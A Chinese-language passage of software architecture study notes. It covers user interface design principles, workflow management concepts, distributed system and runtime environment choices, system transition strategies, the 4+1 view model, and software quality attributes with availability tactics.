&emsp;&emsp;置用户于控制之下：具体来说就是以不强迫用户进入不必要的或不希望的动作的方式来定义交互模式、提供灵活的交互、允许用户交互可以被中断和撤销、当技能级别增长时可以使交互流水化并允许定制交互、使用户隔离内部技术细节、设计应允许用户和出现在屏幕上的对象直接交互。  &emsp;&emsp;减少用户的记忆负担：具体来说就是减少对短期记忆的要求、建立有意义的默认、定义直觉性的捷径、界面的视觉布局应该基于对真实世界的隐喻、以不断进展的方式提示信息。  &emsp;&emsp;保持界面的一致：具体来说，就是允许用户将当前任务放入有意义的语境、在应用系列内保持一致性，如果过去的交互模型已经建立了用户期望，除非有不得已的理由，否则不要改变它。  &emsp;&emsp;除此之外，还应该考虑下表所示的设计原则。|原则|描述||----|----||用户熟悉|界面所使用的术语和概念应该来自于用户的体验，这些用户是将要使用系统最多的人||意外最小化|永远不要让用户对系统的行为感到吃惊||可恢复性|界面应该有一种机制来允许用户从错误中回复||用户指南|在错误发生时，界面应该提供有意义的反馈，并有上下文感知能力的用户帮助功能||用户差异性|界面应该为不同类型用户提供合适的交互功能|### 8.5.2 用户界面设计过程&emsp;&emsp;用户界面的设计过程也应该是迭代的，它通常包括 4 个不同的框架活动，如下图所示。![用户界面设计过程](https://pic.lufer.cc/images/2021/03/15/yVxGxf.png)1. 用户、任务和环境分析  &emsp;&emsp;着重于分析将和系统交互的用户的特点。记录下技术级别、业务理解及对新系统的一般感悟，并定义不同的用户类别。然后对用户将要完成什么样的任务进行详细的标识和描述。最后对用户的物理工作环境进行了解与分析。2. 界面设计  &emsp;&emsp;主要包括建立任务的目标和意图，为每个目标或意图制定特定的动作序列，按在界面上执行的方式对动作序列进行规约，指明系统状态，定义控制机制，指明控制机制如何影响系统状态，指明用户如何通过界面上的信息来解释系统状态。3. 实现  &emsp;&emsp;就是根据界面设计进行实现，前期可以通过原型工具来快速实现，减少返工的工作量。4. 界面确认  &emsp;&emsp;界面实现后就可以进行一些定性和定量的数据收集，以进行界面的评估，以调整界面的设计。## 8.6 工作流设计&emsp;&emsp;工作流技术的发展，经过多年的努力，取得了一定的成果。但在实际应用中，应用的企业还是较少，应用的范围窄，效果不理想。  &emsp;&emsp;流程的设计是对设计者更高的挑战，现实中对计算机所管理的流程需要灵活的定义、方便的路径修改、容易使用，可是这几个目标是矛盾的。更严重的是，如何分析现实中的流程本身就是个困难的问题，更不用谈如何来设计实现了。流程设计的主要困难实际上也就是软件的主要困难：现实复杂性。  &emsp;&emsp;任何对现实的描述（图形也罢，文字也罢）都是不完美的，“不识庐山真面目”是设计面临的共同难题。设计者不得不意识到所有的流程模型都是对现实的简化，计算机只根据确定的信息作判断，而现实中的流程存在大量的不确定性，虽然计算机专家们自信地告诉企业管理者这是管理的问题，信誓旦旦地保证可以用计算机系统来“完善”企业的管理，但他们似乎没有意识到企业管理已经发展了几百年，而计算机还没有百年的历史。    &emsp;&emsp;人们常常抱怨计算机系统的流程设计太过刻板，因为许多时候，标准流程是先于应用构造的且由一些集中的权威强制执行的，所以这种刻板性是不可避免的。同时，对参与者而言缺乏自由度导致工作流管理系统显得很不友好。结果是它们经常被忽略或绕过，甚至最终被放弃。  &emsp;&emsp;另外的困难是：对于流程处理，不但名称众多，例如，动态模型、工作流等，而且对流程的定义也是千姿百态。面对这些困难，设计者无疑需要巨大的勇气来进行流程设计。### 8.6.1 工作流设计概述&emsp;&emsp;限于篇幅，这里只列出工作流管理联盟对于工作流的定义：“工作流是一类能够完全或者部分自动执行的经营过程，根据一系列过程规则、文档、信息或任务在不同的执行者之间传递、执行”。1. 工作流  &emsp;&emsp;简单地说，工作流是现实中的具体工作从开始到结束过程的抽象和概括。这个过程包括了众多因素：任务顺序、路线规则、时间时限约束等。2. 流程定义  &emsp;&emsp;流程定义是指对业务过程的形式化表示，它定义了过程运行中的活动和所涉及的各种信息。这些信息包括过程的开始和完成条件、构成过程的活动及进行活动间导航的规则、用户所需要完成的任务、可能被调用的应用、工作流间的引用关系，以及工作流数据的定义。这个定义的过程可能是由设计者用纸和笔来完成的，但越来越多的设计者倾向于使用流程定义工具来完成这个工作。3. 流程实例  &emsp;&emsp;也常常称为工作，是一个流程定义的运行实例。例如客户的一次订购过程，客服中心受理的一次客户投诉过程等。4. 工作流管理系统  &emsp;&emsp;和数据库管理系统类似，是一个软件系统。这个程序存储流程的定义，按照所使用的流程定义来触发流程状态的改变，推动流程的运转。这个推动的依据常常称为工作流引擎。5. 流程定义工具  &emsp;&emsp;同样是一套软件系统，这个软件和工作流管理系统的关系就如同数据库设计工具和数据库管理系统的关系一样。它可能是独立的软件，也可能是工作流管理系统的一部分。如前所说，设计者常常使用流程定义工具来完成流程定义的工作。它提供一些常用的工作流元素素材，以提高设计者的效率。6. 参与者  &emsp;&emsp;回答业务流程中“谁”这个问题。它可以是具体的人或者角色（企业内部有特别共同作用的多个人），也可以是自动化系统，甚至是其他系统。7. 活动  &emsp;&emsp;活动是流程定义中的一个元素，一次活动可能改变流程处理数据的内容、流程的状态，并可能将流程推动到其他活动中去。活动可以由人来完成，也可以是系统自动的处理过程，典型的自动处理是当活动超过了这个活动可以容忍的时限时，自动过程将向流程定义中指定的参与者发出一条消息。8. 活动所有者  &emsp;&emsp;参与者之一，他有权决定该活动是否结束，当他决定活动结束时，将活动推动到其他活动中，可能是下一个活动，也可能是前一个活动。9. 工作所有者  &emsp;&emsp;工作所有者是有权整体控制流程实例执行过程的参与者。10. 工作项  &emsp;&emsp;代表流程实例中活动的参与者将要执行的工作。 &emsp;&emsp;要分析现实中的处理流程，必须首先描述目标系统的流程，这个过程也可以称为建模。流程是个复杂的事务，必须从多方面才可以描述一个流程，包括：`“谁”`，流程的参与者；`“什么”`，参与者做什么工作；`“何时”`，工作完成的时间限制，还需要说明工作的数据流和完成工作的控制流。人们认为自然语言在描述如此复杂的事务时容易引起歧义，所以人们定义了一些形式化语言试图在自然语言中挑选一个子集，这个子集既可以真正描述流程，又能够摆脱自然语言的复杂和多变，实际上想在人和机器在理解处理流程上架起一座桥梁，如同其他计算机语言及后来发展的统一建模语言一样，这些形式化的语言也称为“工作流定义语言”。  &emsp;&emsp;同样，为了描述实际中的处理流程，人们也想到了图形的方式。有限状态自动机是一种分析状态和改变状态的良好工具，这种方法需要完全列出流程中所有状态及这些状态的组合，当处理流程变得庞大时，自动机所对应的状态图膨胀得太厉害。由于 Petri 网有严格的数学基础和图形化的规范语义，在描述离散事件动态系统方面的能力已经得到公认，具有较强的模型分析能力，在工作流的描述和分析中已经是人们广泛采用的一种方法。虽然有人认为图形并非工作流的最佳表示方法，但由于图形的直观性，大多数设计者都愿意采用图形的描述方式。有关有限状态自动机和 Petri 网的论述请参考其他书籍。### 8.6.2 工作流管理系统&emsp;&emsp;根据工作流管理联盟（Workflow Management Coalition，WFMC）的定义，工作流管理系统是一种“在工作流形式化表示的驱动下，通过软件的执行而完成工作流定义、管理及执行的系统”，其主要目标是对业务过程中各活动发生的先后次序及与活动相关的相应人力或信息资源的调用进行管理，而实现业务过程的自动化。  &emsp;&emsp;如同关系数据库一样，现在已经出现了专门的工作流管理系统，这些系统经过专门的设计，从不同的角度负责解决设计者在流程设计中遇到的共同问题：节点定义、路径选择、数据流动等。不幸的是，和关系数据库共同基于关系代数、支持标准的 SQL 不同，这些工作流管理系统基于不同的数学模型，提供完全不同的接口。所以这些工作流管理系统各具特色，但在通用性和其他系统相互协作上的不足使得这些系统的应用受到了限制。  &emsp;&emsp;WFMC 给出了包含六个基本模块的参考模型，这六个模块被认为是工作流管理系统的最基本组成，这个参考模型同时包括了这些模块之间的接口标准。1. 流程定义工具  &emsp;&emsp;这部分软件提供图形化或者其他方式的界面给设计者。由设计者将实际工作流程进行抽象，并将设计者提交的流程定义转换为形式化语言描述，提供给计算机工作流执行服务进行流程实例处理的依据。2. 工作流执行服务  &emsp;&emsp;这个服务程序是工作流管理系统的核心，它使用一种或者多种数据流引擎，对流程定义进行解释，激活有效的流程实例，推动流程实例在不同的活动中运转。和客户应用程序、其他工作流服务执行程序及其他应用程序进行交互，从而完成流程实例的创建、执行和管理工作。同时这部分软件为每个用户维护一个活动列表，告诉用户当前必须处理的任务。如果有必要，还可以通过电子邮件甚至是短消息的形式提醒用户任务的到达。3. 其他工作流执行服务  &emsp;&emsp;大型的企业工作流应用，往往包括多个工作流管理系统。这就需要这些工作流管理系统之间进行有效的交互，避免画地为牢、信息孤岛的现象出现。4. 客户应用程序  &emsp;&emsp;这是给最终用户的界面，用户通过使用这部分软件对工作流的数据进行必要的处理，如果用户是当前活动的拥有者，还可通过客户应用程序改变流程实例的活动，将流程实例推动到另外一个活动中。5. 被调用应用程序  &emsp;&emsp;这常常是对工作流所携带数据的处理程序，用得很多的是电子文档的处理程序。它们由工作流执行服务在流程实例的执行过程中调用，向最终用户展示待处理数据。在流程定义中应该定义这些应用程序的信息，包括名称、调用方式、参数等。6. 管理和监控工具  &emsp;&emsp;如同数据库管理系统或多或少地提供一些方式告诉管理员当前数据库的使用状态一样，工作流管理系统也应该提供对流程实例的状态查询、挂起、恢复、销毁等操作，同时提供系统参数、系统运行情况统计等数据。&emsp;&emsp;看到这里，没有处理流程设计经验的设计者一定已经云里雾里了。确实，流程设计是系统设计中最困难的一部分，它的复杂性直接来源于现实世界的复杂性。而且直到现在，人们对流程的设计，仍然是在探索之中。## 8.7 简单分布式计算机应用系统的设计&emsp;&emsp;网络极大地扩展了计算机的应用范围，同时，由于升级到更强的服务器的费用常常远远高于购买多台档次稍低的机器，更何况虽然计算机有了长足的发展，可是单台计算机的功能仍然十分有限，利用联网的计算机协同工作，共同完成复杂的工作成为相对成本较低的选择，而且可以完成单台计算机所无法完成的任务。分布式系统使得这一目标成为可能。另外，网络本质上并不可靠，特别是远程通信，分布式系统还带来了并发和同步的问题。  &emsp;&emsp;分布式系统可以由两种完全不同的方式来进行协同和合作，第一种是基于实例的协作。这种方式所有的实例都处理自己范围内的数据，这些对象实例的地位是相同的，当一个对象实例必须要处理不属于它自己范围的数据时，它必须和数据归宿的对象实例通信，请求另外一个对象实例进行处理。请求对象实例可以启动对象、调用远程对象的方法，以及停止运行远程实例。基于实例的协作具有良好的灵活性，但由于实例之间的紧密联系复杂的交互模型，使得开发成本提高，而且，由于实例必须能够通过网络找到，所以通信协议必须包括实例的生存周期管理，这使得基于实例的协作大多只限于统一的网络，对于复杂的跨平台的系统就难以应付。所以基于实例的协作适用于比较小范围内网络情况良好的环境中，这种环境常常被称为近连接。这种情况下对对象的生存周期管理所带来不寻常的网络流量是可以容忍的。  &emsp;&emsp;使用基于实例的协作常常使用被称为“代理”的方法，某个对象实例需要调用远程对象时，它可以只和代理打交道，由代理完成和远程对象实例的通信工作：创建远程对象，提交请求、得到结果，然后把结果提交给调用的对象实例。这样，这个对象实例甚至可以不知道自己使用了远程对象。当远程对象被替换掉（升级）时，对本地代码也没有什么需要修改的地方。  &emsp;&emsp;另外一种方式是基于服务的协作，该方法试图解决基于实例的协作的困难。它只提供远程对象的接口，用户可以调用这些方法，却无法远程创建和销毁远程对象实例。这样减少了交互，简化了编程，而且使得跨平台协作成为可能。同样由于只提供接口，这种协作方式使得对象间的会话状态难以确定，而且通信的数据类型也将有所限制，基本上很难使用自定义的类型。基于服务的协作适用于跨平台的网络，网络响应较慢的情况，这种环境常称为远连接，这时，简化交互性更为重要，而频繁的网络交换数据会带来难以容忍的延时。  &emsp;&emsp;基于服务的协作往往采用分层次的结构，高层次的应用依赖于低层次的对象，而低层次对象实例的实现细节则没有必要暴露给高层次对象，这种安排使得高层次的实现不受低层次如何实现的影响，同时，当低层次服务修改时，高层次的服务也不应该受到影响。  &emsp;&emsp;设计者在进行设计时，通常会倾向于比较细致的设计，对象往往提供了大量的操作和方法，响应许多不同的消息，以增加达到系统的灵活性、可维护性等。这在单个系统中没有什么问题，当考虑分布式系统的设计时，这种细致的设计所带来对对象方法的大量调用会比较严重地影响性能，所以在分布式系统中，倾向于使用大粒度的设计方式，往往在一个方法中包含了许多参数，每个方法基本上代表了一个独立的功能。当然这样的设计使得参数的传递变得复杂，当需要修改参数时，需要对比较大范围的一段过程代码进行修改，而不是像小粒度设计一样，只需要修改少量的代码。## 8.8 系统运行环境的集成与设计&emsp;&emsp;在设计一个新的系统时，设计者必须考虑目标系统的运行环境问题，人们往往认为软件应该能够在任何环境中运行，常常看到这样的系统，硬件已经升级了多次，而软件还是原来的软件。软件的运行环境是指系统运行的设备、操作系统和网络配置。  &emsp;&emsp;本节给出软件运行的几个典型环境，设计者可以从这几种典型环境中选择适合自己的目标系统的环境，也可以将这些典型环境做一些组合，来满足自己设计的系统的特殊要求。### 1．集中式系统&emsp;&emsp;早期的计算机系统没有什么可以选择的，除了集中式系统。所有的操作都集中于一台主机中，而操作员必须在主机的附近操作，结果也在附近给出。这种系统仍然广泛地应用于批处理应用系统及更大的分布式系统的一部分。集中式系统常见于银行、保险、证券行业，它们含有大规模的处理应用。而现在流行的电子商务又给大型处理机注入了新的活力，人们发现电子商务要面对大量的事务，需要大型处理机来处理。但是，实践中很少单独使用集中式系统，因为大量的系统需要处理在地理上分布得很远的连接请求，这些请求有的需要实时响应，并可能要发送到其他某个地方的一个集中式系统。所以，在现代的系统中，集中式系统通常是某个分布式系统的一个环节。  &emsp;&emsp;集中式系统由以下几个部分组成。1. 单计算机结构  &emsp;&emsp;这种结构简单、容易维护，但是处理能力受到限制。2. 集群结构  &emsp;&emsp;由多个计算机组成，这些计算机具有类似的硬件平台、操作系统等。通常采用负载均衡、资源共享等方式实现更大的处理能力和容量。3. 多计算机结构  &emsp;&emsp;由多个计算机组成，这些计算机之间操作环境可能不同。适用于当系统可以分解成多个不同的子系统时。### 2．分布式系统&emsp;&emsp;分布式系统由于网络的普遍延伸，费用的不断降低而越来越成为大型系统的首选环境。分布式系统必须基于网络，这个网络可以是在一个地域内的局域网，也可以是跨越不同城市乃至国家的广域网。对比集中式的计算机环境，分布式系统有着多种多样的形式。这也给设计者在确定系统运行环境时带来一定的烦恼。### 3．C/S 结构&emsp;&emsp;系统由提供服务的服务器和发起请求、接受结果的客户机构成。这种结构是一种可以使用很多方式实现的通用结构模型。并非只限于数据库的 C/S 结构，典型的还有网络打印服务系统，现在流行的网络游戏也显然是基于这种结构的。### 4．多层结构&emsp;&emsp;这种结构是 C/S 结构的扩展，典型的分为由存储数据的数据库服务器作为数据层、实现商业规则的程序作为逻辑层、管理用户输入输出的视图层所组成的三层结构。当系统更复杂时，可以再增加其他层次构成多层结构。  &emsp;&emsp;多层结构形式复杂，功能多样。实现多层结构常常需要来实现不同层次间通信的专门程序——管件，也称为中间件。中间件大多数实现远程程序调用、对象请求调度等功能。现代企业级的计算机系统大量地基于分布式结构。支持分布式系统的软件也曾经如同雨后春笋。系统如何分层、如何处理分布带来的同步等问题也就同样在考验设计者。### 5.Internet、Intranet 和 Extranet&emsp;&emsp;Internet 是全球的网络集合，使用通用的 TCP/IP 协议来相互连接。Internet 提供电子邮件、文件传输、远程登录等服务。Intranet 是私有网络，只限于内部使用，也使用 TCP/IP协议。Extranet 是一个扩展的 Intranet。它包括企业之外的和企业密切相关合作的其他企业。Extranet 允许分离的组织交换信息并进行合作，这样就形成了一个虚拟组织。现在的 VPN技术允许在公用网络上架构只对组织内部开发服务。  &emsp;&emsp;Web 同样基于 C/S 结构，实际上 Web 接口是一个通用的接口，不是只能使用浏览器的协议，它同样能够在普通的程序中使用。Internet 和 Web 已经给设计者提供了一个非常富有吸引力的选择方案。它的优势在于：它们已经成为网络的事实上的标准，支持它们的软件已经广泛地存在于全世界的计算机中，而且通信费用已经下降到很有竞争力的水平。从某种程度上来说，企业可以把 Internet 当作自己廉价的广域网。没有它们，电子商务还是水中月。  &emsp;&emsp;当然，事物有相反的一面，当设计者试图采用 Internet 时，必须考虑其不利的一面。Internet 的安全性过去是，现在是，以后仍然是设计者头痛的问题。其他诸如可靠性、系统吞吐量、不断发展的技术和标准都是影响系统选择它们作为运行环境的不利因素。设计者应该根据目标系统的实际需要来选择不同的运行环境。不过，已经有越来越多的公司提供支持 Internet 和电子商务的接口。## 8.9 系统过渡计划&emsp;&emsp;当新系统似乎开发完毕，要取代原来的系统时，系统过渡就是设计者不得不面对的问题。不幸的是，这个问题比许多人想象得要复杂，和软件开发一样，存在着许多冲突和限制。例如，费用、客户关系、后勤保证和风险等。设计者需要考虑的问题也很多，其中比较重要的几个问题是：  &emsp;&emsp;如果同时运行两个系统，会给客户造成多大的开销；  &emsp;&emsp;如果直接运行新系统，客户面对的风险有多大；  &emsp;&emsp;对新系统试运行时的查错和纠错，以及出现严重错误而导致停止运行时的应急措施；  &emsp;&emsp;客户运行新系统将面临的不利因素有哪些；  &emsp;&emsp;人员的培训。&emsp;&emsp;使用不同的系统过渡方案意味着不同的风险，不同的费用及不同的复杂度。### 1．直接过渡&emsp;&emsp;这是一种快速的系统过渡方式，当新系统运行时，立即关闭原来的系统。这种过渡方式非常简单，没有后勤保障的问题，也不要消耗很多资源。同时，它也意味着大风险，目标系统的特性决定了风险的大小。设计者主要要权衡当新系统失败时，系统停止运行或者勉强运行给客户带来的损失有多大。由于这种过渡方式简单而费用低廉，对于可以容忍停机一段时间的系统的实践者，可以采用这种方式。### 2．并行过渡&emsp;&emsp;设计者采用并行过渡方式，让新系统和旧系统在一段时间里同时运行，通过这样的旧系统作为新系统的备份，可以大大降低系统过渡的风险。可是并行过渡显然比直接过渡要消耗更多的资源：现有的硬件资源必须保证能同时跑两套系统，这常常意味着增加服务器和额外的存储空间，需要增加人员来同时使用两套系统，或者增加现有员工的工作量，让他们同时操作两套系统。这种方式同时也增加了管理和后勤保障的复杂度。据统计，并行过渡时期的开销是旧系统单独运行时的 2.5～3 倍。  &emsp;&emsp;设计者还会发现有些系统无法使用并行过渡的方式，主要是客户没有足够的资源来维持两个系统同时运行，另外一种情况是新、旧系统差别太大，旧系统的数据无法为新系统采用。当客户无法使用并行过渡，又想尽可能地减少风险，设计者可以使用部分并行过渡的策略，使并行的开销减少到客户能够接受的范围内。### 3．阶段过渡&emsp;&emsp;通常在系统非常复杂、过于庞大以至于无法一次性进行过渡时采用，也适用于分阶段开发的系统。设计者需要设计一系列步骤和过程来完成整个系统的过渡，这种过渡方式和系统的复杂程度相关，随着系统的不同往往有很大的不同。和并行过渡一样，阶段过渡也能够减少风险，显然局部的失败要比全体的失败更容易接受，带来的损失更小。阶段过渡也带来了复杂性，有时候比并行过渡更加复杂。# 第九章 软件架构设计### 9.1.3 架构的模型&emsp;&emsp;软件架构作为一个有机的整体，可以分解成多个侧面来认识，每个侧面强调它的不同方面的特征，从而使架构设计师能整体地把握它的重点。我们可以将软件架构归纳成 5 种模型：结构模型、框架模型、动态模型、过程模型和功能模型。最常用的是结构模型和动态模型。1. 结构模型  &emsp;&emsp;这是一个最直观、最普遍的建模方法。这种方法以架构的构件、连接件和其他概念来刻画结构，并力图通过结构来反映系统的重要语义内容，包括系统的配置、约束、隐含的假设条件、风格、性质。研究结构模型的核心是架构描述语言。2. 框架模型  &emsp;&emsp;框架模型与结构模型类似，但它不太侧重描述结构的细节而更侧重于整体的结构。框架模型主要以一些特殊的问题为目标建立只针对和适应该问题的结构。3. 动态模型  &emsp;&emsp;动态模型是对结构或框架模型的补充，研究系统“大颗粒”的行为性质。例如，描述系统的重新配置或演化。动态可能指系统总体结构的配置、建立或拆除通信通道或计算的过程。4. 过程模型  &emsp;&emsp;过程模型研究构造系统的步骤和过程。因而结构是遵循某些过程脚本的结果。5. 功能模型  &emsp;&emsp;该模型认为架构由一组功能构件按层次组成，且下层向上层提供服务。它可以看作是一种特殊的框架模型。&emsp;&emsp;这 5 种模型各有所长，也许将 5 种模型有机地统一在一起，形成一个完整的模型来刻画软件架构更合适。即将软件架构视为这些模型的统一体，通过这些模型的表述（文档）来完整反映软件架构。例如，Kruchten 在 1995 年提出了一个“4+1”的视图模型。“4+1” 视图模型从 5 个不同的视角包括逻辑视图、进程视图、物理视图、开发视图和场景视图来描述软件架构。每一个视图只关心系统的一个侧面，5 个视图结合在一起才能反映系统的软件架构的全部内容。“4+1”视图模型如下图所示。![“4+1”视图模型](https://pic.lufer.cc/images/2021/03/15/yM6WeP.png)1. 逻辑视图  &emsp;&emsp;主要支持系统的功能需求，即系统提供给最终用户的服务。在逻辑视图中，系统分解成一系列的功能抽象，这些抽象主要来自问题领域。这种分解不但可以用来进行功能分析，而且可用作标识在整个系统的各个不同部分的通用机制和设计元素。在面向对象技术中，通过抽象、封装和继承，可以用对象模型来代表逻辑视图，用类图来描述逻辑视图。逻辑视图中使用的风格为面向对象的风格，逻辑视图设计中要注意的主要问题是要保持一个单一的、内聚的对象模型贯穿整个系统。2. 开发视图  &emsp;&emsp;也称为模块视图，主要侧重于软件模块的组织和管理。软件可通过程序库或子系统进行组织，这样，对于一个软件系统，就可以由不同的人进行开发。开发视图要考虑软件内部的需求，如软件开发的容易性、软件的重用和软件的通用性，要充分考虑由于具体开发工具的不同而带来的局限性。开发视图通过系统输入输出关系的模型图和子系统图来描述。可以在确定了软件包含的所有元素之后描述完整的开发角度，也可以在确定每个元素之前，列出开发视图原则。3. 进程视图  &emsp;&emsp;侧重于系统的运行特性，主要关注一些非功能性的需求，例如系统的性能和可用性。进程视图强调并发性、分布性、系统集成性和容错能力，以及逻辑视图中的主要抽象的进程结构。它也定义逻辑视图中的各个类的操作具体是在哪一个线程中被执行的。进程视图可以描述成多层抽象，每个级别分别关注不同的方面。4. 物理视图  &emsp;&emsp;主要考虑如何把软件映射到硬件上，它通常要考虑到解决系统拓扑结构、系统安装、通信等问题。当软件运行于不同的节点上时，各视图中的构件都直接或间接地对应于系统的不同节点上。因此，从软件到节点的映射要有较高的灵活性，当环境改变时，对系统其他视图的影响最小。5. 场景  &emsp;&emsp;可以看作是那些重要系统活动的抽象，它使四个视图有机地联系起来，从某种意义上说，场景是最重要的需求抽象。在开发架构时，它可以帮助设计者找到架构的构件和它们之间的作用关系。同时，也可以用场景来分析一个特定的视图，或描述不同视图构件间是如何相互作用的。场景可以用文本表示，也可以用图形表示。>&emsp;&emsp;逻辑视图和开发视图描述系统的静态结构，而进程视图和物理视图描述系统的动态结构。对于不同的软件系统来说，侧重的角度也有所不同。例如，对于管理信息系统来说，比较侧重于从逻辑视图和开发视图来描述系统，而对于实时控制系统来说，则比较注重于从进程视图和物理视图来描述系统。## 9.2 架构需求与软件质量属性&emsp;&emsp;架构的基本需求主要是在满足功能属性的前提下，关注软件质量属性，架构设计则是为满足架构需求（质量属性）寻找适当的“战术”。  &emsp;&emsp;软件属性包括功能属性和质量属性，但是，软件架构（及软件架构设计师）重点关注的是质量属性。因为，在大量的可能结构中，可以使用不同的结构来实现同样的功能性，即功能性在很大程度上是独立于结构的，架构设计师面临着决策（对结构的选择），而功能性所关心的是它如何与其他质量属性进行交互，以及它如何限制其他质量属性。### 9.2.1 软件质量属性&emsp;&emsp;《GB/T16260-1996(idt ISO／IEC9126：1991)信息技术软件产品评价质量特性及其使用指南》中描述的软件质量特性包括`功能性`、`可靠性`、`易用性`、`效率`、`可维护性`、`可移植性`等6个方面，每个方面都包含若干个子特性。  &emsp;&emsp;功能性：适合性、准确性、互操作性、依从性、安全性；  &emsp;&emsp;可靠性：成熟性、容错性、易恢复性；  &emsp;&emsp;易用性：易理解性、易学性、易操作性；  &emsp;&emsp;效率：时间特性、资源特性；  &emsp;&emsp;可维护性：易分析性、易改变性、稳定性、易测试性；  &emsp;&emsp;可移植性：适应性、易安装性、遵循性、易替换性；  &emsp;&emsp;正如上述列举与分类，软件的质量属性很多，也有各种不同的分类法和不同的表述。虽然术语没有统一的定义，但其含义可以认为业界已有共识。下面选取常用的质量属性术语，并做逐一说明。#### 1．运行期质量属性&emsp;&emsp;性能：性能是指软件系统及时提供相应服务的能力。包括`速度`、`吞吐量`和`持续高速性`三方面的要求。  &emsp;&emsp;安全性：指软件系统同时兼顾向合法用户提供服务，以及阻止非授权使用的能力。  &emsp;&emsp;易用性：指软件系统易于被使用的程度。  &emsp;&emsp;可伸缩性：指当用户数和数据量增加时，软件系统维持高服务质量的能力。例如，通过增加服务器来提高能力。  &emsp;&emsp;互操作性：指本软件系统与其他系统交换数据和相互调用服务的难易程度。  &emsp;&emsp;可靠性：软件系统在一定的时间内无故障运行的能力。  &emsp;&emsp;持续可用性：指系统长时间无故障运行的能力。与可靠性相关联，常将其纳入可靠性中。  &emsp;&emsp;鲁棒性：是指软件系统在一些非正常情况（如用户进行了非法操作、相关的软硬件系统发生了故障等）下仍能够正常运行的能力。也称健壮性或容错性。#### 2.开发期质量属性&emsp;&emsp;易理解性：指设计被开发人员理解的难易程度。  &emsp;&emsp;可扩展性：软件因适应新需求或需求变化而增加新功能的能力。也称为灵活性。  &emsp;&emsp;可重用性：指重用软件系统或某一部分的难易程度。  &emsp;&emsp;可测试性：对软件测试以证明其满足需求规范的难易程度。   &emsp;&emsp;可维护性：当需要修改缺陷、增加功能、提高质量属性时，定位修改点并实施修改的难易程度；  &emsp;&emsp;可移植性：将软件系统从一个运行环境转移到另一个不同的运行环境的难易程度。 &emsp;&emsp;在实践中，架构设计师追求质量属性常常陷入“鱼和熊掌”的两难境地，这就需要架构设计师的决策智慧了。下表反映了质量属性之间的相互制约关系（正相关或负相关），其中“+”代表“行属性”能促进“列属性”；而“-”则相反。例如，第一列符号说明许多属性（行）对性能（列）有副作用，第一行符号说明性能（行）对许多属性（列）有副作用，认识这一点，对于架构决策的权衡很重要。||性能|安全性|持续可用性|可互操作性|可靠性|鲁棒性|易用性|可测试性|可重用性|可维护性|可扩展性|可移植性||-|-|-|-|-|-|-|-|-|-|-|-|-||性能||||-|-|-|-|-||-|-|-||安全性|-|||-|||-|-|-|||||持续可用性|||||+|+||||||||可互操作性|-|-|||||||||+|+||可靠性|+||+|||+|+|+||+|+|||鲁棒性|-||+||+||+|||||||易用性|-|||||+||-||||||可测试性|-||+||+||+|||+|+|||可重用性|-|-||+|-|||+||+|+|+||可维护性|-||+||+|||+|||+|||可扩展性|-|-|||+|||+||+||+||可移植性|-|||+||||+|+||+||### 9.2.2 6个质量属性及实现&emsp;&emsp;本节从架构关注点来研究质量属性实现，将质量属性分为 6 种：可用性、可修改性、性能、安全性、可测试性、易用性。其他的质量属性一般可纳入这几个属性中（在其他文献中为了强调常单列出来），例如，可扩充性可归入可修改性中（修改系统容量），可移植性也可以作为平台的可修改性来获得。对于未能纳入的其他质量属性，可以用本章的方法进行研究。  &emsp;&emsp;那么，如何描述质量属性需求呢？采用质量属性场景作为一种描述规范，它由以下6个部分组成，如下图所示。![质量属性场景](https://pic.lufer.cc/images/2021/03/15/y1X7fU.png)&emsp;&emsp;刺激源：生成该刺激的实体（人、计算机系统或其他激励器）；  &emsp;&emsp;刺激：刺激到达系统时可能产生的影响（即需要考虑和关注的情况）；  &emsp;&emsp;环境：该刺激在某条件内发生。如系统可能正处于过载情况；  &emsp;&emsp;制品：系统中受刺激的部分（某个制品被刺激）；  &emsp;&emsp;响应：刺激到达后所采取的行动；  &emsp;&emsp;响应度量：当响应发生时，应能够以某种方式对应其度量，用于对是否满足需求的测试。&emsp;&emsp;需要将一般的质量属性场景（一般场景）与具体的质量属性场景（具体场景）区别开来，前者是指独立于具体系统、适合于任何系统的一般性场景；而后者是指适合于正在考虑的某个特定系统的场景，具体场景通常是指从一般场景中抽取特定的、面向具体系统的内容。下面几个小节中为每个质量属性提供一张表，该表中给出了质量属性场景每部分的一些可能取值，整体上形成一个一般场景的表格描述。在实际应用时，根据系统的具体情况，从该表中选取适当的值，就能变成具体场景（可读性强、可应用），可以把具体场景的集合作为系统的质量属性需求。  &emsp;&emsp;实现这些质量属性的基本设计决策，称为“战术”，而把战术的集合称为“架构策略”。  &emsp;&emsp;这些架构策略供架构设计师选择。下面几个小节将对各质量属性的战术进行示例性的总结。&emsp;&emsp;“战术”作为逻辑部件位于质量属性场景图的制品中，它旨在控制对刺激的响应。#### 1．可用性及其实现战术##### 1. 可用性的描述  &emsp;&emsp;可用性的描述如下表所示。|场景的部分|可能的值||-|-||刺激源|系统内部、系统外部||刺激|错误：疏忽（构建对某输入未做出反应）、崩溃、时间不当（响应时间太早或太迟）、响应不当（以一个不正确的值来响应）||制品|系统的处理器、通信通道、存储器、进程||环境|正常操作、降级模式||响应|系统应记录检测事件，并进行如下一个或多个活动：<br> * 将其记录下来<br>* 通知适当的各方，包括用户和其他系统<br>* 根据规则屏蔽导致错误或故障的事件源<br>* 不可用（进入修理状态）<br>* 继续在正常或降级模型下运行||响应度量|可用时间、修复时间、各种情况的时间间隔|&emsp;&emsp;可用性一般场景可以用下图表示。![可用性一般场景](https://pic.lufer.cc/images/2021/03/15/y1xdOJ.png)&emsp;&emsp;对一般场景进行具体化可以得到可用性具体场景，如下图所示。![可用性的一个具体场景（示例）](https://pic.lufer.cc/images/2021/03/15/y1xhmd.png)##### 2. 可用性战术  &emsp;&emsp;可用性战术的目标是阻止错误发展成故障，至少能够把错误的影响限制在一定范围内，从而使修复成为可能。战术分为：错误检测、错误恢复、错误预防。1. 错误检测  &emsp;&emsp;命令/响应：一个构件发出一个命令，并希望在预定义的时间内收到一个来自审查构件的响应，例如远程错误的检测。  &emsp;&emsp;心跳（计时器）：一个构件定期发出一个心跳消息，另一个构件收听到消息，如果未收到心跳消息，则假定构件失败，并通知错误纠正构件。  &emsp;&emsp;异常：当出现异常时，异常处理程序开发执行。2. 错误恢复  &emsp;&emsp;表决：通过冗余构件（或处理器）与表决器连接，构件按相同的输入及算法计算输出值交给表决器，由表决器按表决算法（如多数规则）确定是否有构件出错，表决通常用在控制系统中。  